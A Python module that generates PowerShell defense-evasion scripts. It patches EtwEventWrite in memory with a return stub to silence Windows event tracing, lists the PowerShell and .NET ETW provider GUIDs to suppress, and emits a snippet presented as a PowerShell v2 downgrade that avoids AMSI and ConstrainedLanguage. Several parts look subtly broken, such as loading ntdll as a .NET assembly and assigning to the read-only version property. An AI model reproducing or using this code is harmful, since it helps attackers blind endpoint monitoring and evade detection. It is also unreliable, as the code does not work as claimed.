ETW_SUPPRESSION_PATCH = (
    b"\x48\x33\xC0"           # xor rax, rax
    b"\xC3"                    # ret
)


def etw_suppression_script() -> str:
    import base64
    b64 = base64.b64encode(ETW_SUPPRESSION_PATCH).decode()
    return f'''$patch = [System.Convert]::FromBase64String("{b64}")
$ntdll = [System.Reflection.Assembly]::LoadWithPartialName("ntdll")
$etwEventWrite = $ntdll.GetType("Microsoft.Win32.NativeMethods").GetMethod("EtwEventWrite")
if ($etwEventWrite) {{
    $addr = $etwEventWrite.MethodHandle.GetFunctionPointer()
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
}}
'''


def etw_event_suppress(event_providers: list[str] = None) -> dict:
    return {
        "technique": "ETW event suppression",
        "providers": event_providers or [
            "{E13B77A8-14B6-11DE-8069-0019DBBD5C4D}",  # Microsoft-Windows-PowerShell
            "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",  # .NET Runtime
        ],
        "method": "NtSetInformationProcess(ProcessTraceFlags) → EtwEventWrite patching"
    }


def powershell_downgrade_script() -> str:
    return (
        '$PSVersionTable.PSVersion.Major = 2; '
        'if ($PSVersionTable.PSVersion.Major -le 2) { '
        'Write-Host "PowerShell v2 — no AMSI, limited ETW, no ConstrainedLanguage" '
        '}'
    )
